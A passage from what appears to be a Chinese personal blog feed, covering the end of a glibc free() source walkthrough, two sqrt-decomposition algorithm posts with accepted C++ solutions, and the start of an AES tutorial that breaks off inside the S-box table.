chunk</code>的大小还会清空<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，如果不理解可以往上翻一下看看。目录标题为“最后一小块”，那边是切割<code>bin</code>的时候设置的。</p><h4 id="第五部分：最后的处理"><a href="#第五部分：最后的处理" class="headerlink" title="第五部分：最后的处理"></a>第五部分：最后的处理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">            systrim(mp_.top_pad, av);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如注释所说，如果我一次释放了一个很大的空间(<code>0x10000B</code>)，那么会调用<code>malloc_consolidate</code>合并所有<code>fast bin</code>，如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用<code>systrim</code>收缩内存，否则就获得非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>收缩<code>heap</code>。因为我们认为一次<code>free</code>很大的空间那么操作系统可以适当回收点内存了，大不了等你不够就再像我要嘛，资源的合理配置，很合理。</p><p>至此，<code>free</code>部分的源码也都分析完啦。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>就不向<code>malloc</code>一样描述具体步骤了，因为本身逻辑没有很复杂。主要就是<code>free</code>非<code>fast bin chunk</code>的向前合并或者向后合并。</p><p><code>free</code>在<code>fast bin</code>范围内的<code>chunk</code>，直接将<code>chunk</code>链入<code>fast bin</code>，<code>free</code>非<code>fast bin</code>范围的<code>chunk</code>视具体情况向前合并或者向后合并然后加入<code>unsorted bin</code>，如果一次<code>free</code>太多的空间有可能会被操作系统回收。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>源码分析也就完结撒花了，后续可能会出heap的各种利用方式和利用手段，或者局部分析其它版本的libc。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学了这么久堆漏洞了，我想应该把&lt;code&gt;glibc&lt;/code&gt;的&lt;code&gt;malloc&lt;/code&gt;和&lt;code&gt;free&lt;/code&gt;源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>分块入门2</title>
    <link href="http://example.com/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/"/>
    <id>http://example.com/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/</id>
    <published>2021-12-22T19:00:00.000Z</published>
    <updated>2021-12-22T19:20:26.935Z</updated>
    
    <content type="html"><![CDATA[<p>谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/1.png" alt="1"></p><p>题目意思还是很清晰的。要求区间加法，区间查询符合条件的值。至于加法完全可以照搬前一道题目的方式，但是查询的操作着实有点耐人寻味了，因为区间查询意味着我们得采用分块的思想，不能暴力求解。首先我想到让每一个块变得有序，然后lower_bound查到第一个大于等于某个值的第一个元素的位置。首先对所有块排序的复杂度为√n * √n log_2(√n)也就是nlog_2(n)的复杂度，然后每一次查询最多是√n的复杂度，每一次区间加法是√n的复杂度，区间加法还要对固定两个残缺块进行重新排序(因为两边的残缺块可能会破坏有序结构，而中间的则会保持原来的顺序)，这又需要2√nlog_2(√n)的复杂度。查询和加法一起是n√n的复杂度，所以整个算法就是n√n的复杂度，理论可行但是实践可惨死了。</p><p>首先，序列排序直接破坏了它的序列结构，这导致我在前一天20点-24点的提交一直不通过。后来我意识到了不能破坏它原有的序列，于是想到每个块用一个vector去保存。更新的时候clear再一个个push然后一个sort即可。然后又不行，发现是边界问题，因为我过于追求极限，因此会判断两边的块是否为完整块，完整则一起处理，不完整则先处理，这样导致如果没有处理，那么下面的循环条件没注意就不会被处理了。所以最好的方法就是，不管它，l那个点所在的块我就先处理，管你玩不完整的，右边的r也一样。</p><p>处理完了这个之后，我又被90分卡住了，最后发现是最后一个不完整的块它没有预先排序，但是其实是要的，虽然我也不知道为什么，因为我当时是感觉，它不可能会被当成一个完整的块，就基本没去管它了。但是事实就是这么魔幻：不管我就不让你过，就搞你心态。</p><p>然后来看看孩子的提交记录吧。</p><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/2.png" alt="2"></p><p>真的是太不容易了，下面给出我的AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],bl[maxn],tag[maxn],block,n;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    v[x].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x*block;i&lt;<span class="built_in">min</span>((x+<span class="number">1</span>)*block,n);i++)&#123;</span><br><span class="line">        v[x].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(v[x].<span class="built_in">begin</span>(),v[x].<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[l]);</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[r]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        tag[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">lower_bound</span>(v[i].<span class="built_in">begin</span>(),v[i].<span class="built_in">end</span>(),num-tag[i])-v[i].<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>)ans+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    block=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        bl[i]=i/block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bl[n<span class="number">-1</span>];i++)&#123;</span><br><span class="line">        <span class="built_in">update</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        l--,r--;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)<span class="built_in">add</span>(l,r,c);</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">query</span>(l,r,c*c)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="分块" scheme="http://example.com/categories/icpc/algorithm/%E5%88%86%E5%9D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>分块入门</title>
    <link href="http://example.com/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/</id>
    <published>2021-12-21T18:00:00.000Z</published>
    <updated>2021-12-21T17:59:31.962Z</updated>
    
    <content type="html"><![CDATA[<p>最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。</p><span id="more"></span><h1 id="数列分块"><a href="#数列分块" class="headerlink" title="数列分块"></a>数列分块</h1><p>分块是我感觉是最优雅的暴力了，适用于同时区间修改和区间查询，而且书写十分方便。对于动态维护序列的题目我们一般会想到树状数组和线段树结构。</p><p>树状数组的限制十分明显，不能同时进行区间修改和区间查询地操作，只能支持单点修改+区间查询或者是区间修改和单点查询。虽然此题可以用树状数组做，但是主要还是练习一下分块。</p><p>线段树可以说是非常棒的动态维护序列的数据结构了，时间复杂度非常优秀，但是书写起来十分复杂。</p><p>分块也并不是万能的，如果同时区间修改和区间查询且数据范围在1e6的范围，那么分块就很可能超时了，此时只能使用线段树结构去维护这个序列。</p><p>各有优缺点吧，主要是分块的这个思想得学会，在很多地方都用得到。</p><p>下面给出分块算法中的一些特有名词</p><p>区间：数列中连续一段的元素</p><p>区间操作：将某个区间[a,b]的所有元素进行某种改动的操作</p><p>块：我们将数列划分成若干个不相交的区间，每个区间称为一个块</p><p><strong>整块</strong>：在一个区间操作时，完整包含于区间的块</p><p><strong>不完整的块</strong>：在一个区间操作时，只有部分包含于区间的块，即区间左右端点所在的两个块</p><h2 id="入门1"><a href="#入门1" class="headerlink" title="入门1"></a><a href="https://loj.ac/p/6277">入门1</a></h2><p>本道练习题在loj上，链接已经给出。</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>数据范围在5w，如果用朴素的算法那么必超时的。这个时候我们可以把整个序列分成一块一块的，那么到底怎么分呢，最优的分法应该是每一块包含(int)sqrt(n)个数据，最多能把数据分成(int)sqrt(n)+1块。那么在进行一次区间修改的时候，我们同样可以把区间按照分块的方式去操作，对于一个区间分出的每一个块，如果这个块有sqrt(n)个数据那么称这个块是完整的，否则是不完整的。对于完整的块，我们可以给一个标记数组，标记这个块整体都被加上了某个值；对于不完整的块我们可以对整个不完整的块内的数据进行单点修改。那么一次区间修改的操作复杂度就是sqrt(n)了。单点查询的时候只需要找到那个元素的值加上那个元素所在区间的标记就是该元素的实际值。</p><p>这里需要考虑以下几种情况：</p><p>左端点在块的起点，右端点不在另一个块的终点：需要先处理右端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点不在块的起点，右端点在另一个块的终点：需要先处理左端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点在块的起点，右端点在另一个块的终点：直接对所有块进行标记即可。</p><p>左端点与右端点在同一个块上，且完整占据整个块：直接对该块标记。</p><p>左端点与右端点在同一个块上，且不完整占据整个块：直接对区间内的元素进行修改即可。</p><p>刚开始考虑情况不周，导致WA了很多次，下面贴出AC代码和测评情况。</p><p>标程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> block[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    <span class="keyword">int</span> block_size=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c,i;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)/block_size==(r<span class="number">-1</span>)/block_size)&#123;</span><br><span class="line">                <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size==<span class="number">0</span>&amp;&amp;r%block_size==<span class="number">0</span>)&#123;</span><br><span class="line">                    block[(l<span class="number">-1</span>)/block_size+<span class="number">1</span>]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">                        a[i]+=c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(i=l;i&lt;=<span class="built_in">min</span>(((l<span class="number">-1</span>)/block_size+<span class="number">1</span>)*block_size,r);i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                l=i<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(r%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(i=<span class="built_in">max</span>((r<span class="number">-1</span>)/block_size*block_size+<span class="number">1</span>,l);i&lt;=r;i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                r=r/block_size*block_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=l/block_size+<span class="number">1</span>;i&lt;=r/block_size;i++)&#123;</span><br><span class="line">                block[i]+=c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[r]+block[(r<span class="number">-1</span>)/block_size+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本蒟蒻测评的状况</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>这算正式入门了以下这个分块吧，后面把这个分块的所有入门都做了先。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="分块" scheme="http://example.com/categories/icpc/algorithm/%E5%88%86%E5%9D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>AES加密学习</title>
    <link href="http://example.com/2021/12/18/AES%E5%8A%A0%E5%AF%86/"/>
    <id>http://example.com/2021/12/18/AES%E5%8A%A0%E5%AF%86/</id>
    <published>2021-12-18T02:00:00.000Z</published>
    <updated>2021-12-18T13:52:15.143Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学学AES。</p><span id="more"></span><h1 id="AES简介"><a href="#AES简介" class="headerlink" title="AES简介"></a>AES简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/1.png" alt="1"></p><h2 id="分组问题"><a href="#分组问题" class="headerlink" title="分组问题"></a>分组问题</h2><p>AES属于分组加密，什么是分组加密呢，顾名思义，分组加密=分组+加密(狗头。分组就是说把它分成一个个组进行加密，可以把它和base64作为一个对比，base64是三个字符一组进行编码，那么既然是要分组那必然也会遇到分组不满的情况，这个时候需要加上填充。这个填充呢，有很多种方案。</p><h3 id="零字节填充"><a href="#零字节填充" class="headerlink" title="零字节填充"></a>零字节填充</h3><p>这个可以说是比较常见的手段了，一般人一般也都能想得到，但是这样的话难以区分末尾的0到底是它的信息本来就存在的还是填充的，信息表达不明确。</p><h3 id="填充n位n"><a href="#填充n位n" class="headerlink" title="填充n位n"></a>填充n位n</h3><p>这个略有点意思。但是假如它本来信息就有n位n呢？那么最后的那n位n还是没办法区分是不是它本来就有的。</p><p>那么最终AES采取了哪种填充方式呢？它选择在第二种方案中改进，如果长度刚好不需要填充，那么就填充16位16。这么一来，如果它末尾存在了n位n，但是由于长度满足16的倍数，那么还会填充16位16，这样它就能够区分填充位和明文位了。</p><h2 id="AES常见分类"><a href="#AES常见分类" class="headerlink" title="AES常见分类"></a>AES常见分类</h2><p>AES有三种常见加密标准，根据密钥位数不同用于区分，密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（字节)</th><th>分组长度(字节)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>16</td><td>16</td><td>10</td></tr><tr><td>AES-192</td><td>24</td><td>16</td><td>12</td></tr><tr><td>AES-256</td><td>32</td><td>16</td><td>14</td></tr></tbody></table><p>AES还有五种加密模式：1.电码本模式（Electronic Codebook Book (ECB)）；2.密码分组链接模式（Cipher Block Chaining (CBC)）；3.计算器模式（Counter (CTR)）；4.密码反馈模式（Cipher FeedBack (CFB)）；5.输出反馈模式（Output FeedBack (OFB)）。</p><p>本片博客只介绍前两种模式。</p><h1 id="AES加密流程"><a href="#AES加密流程" class="headerlink" title="AES加密流程"></a>AES加密流程</h1><p>AES的EBC模式大概可以用下面的流程图图表示</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/2.png" alt="2"></p><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><p>官方的解释是，建立16*16的字节表，然后把自己拆成高4位和低四位，高四位位行，第四位为列好去查表替换。这个很好理解，其实就是在0x00-0xff字节内建立双射，让每个字节替换为其它字节。比如最简单的，我让所有字节都加1%256，也是一个双射变换。那么既然是一个双射，那么我们很容易求出它的逆。</p><p>一般AES加密用以下的字节替换表</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0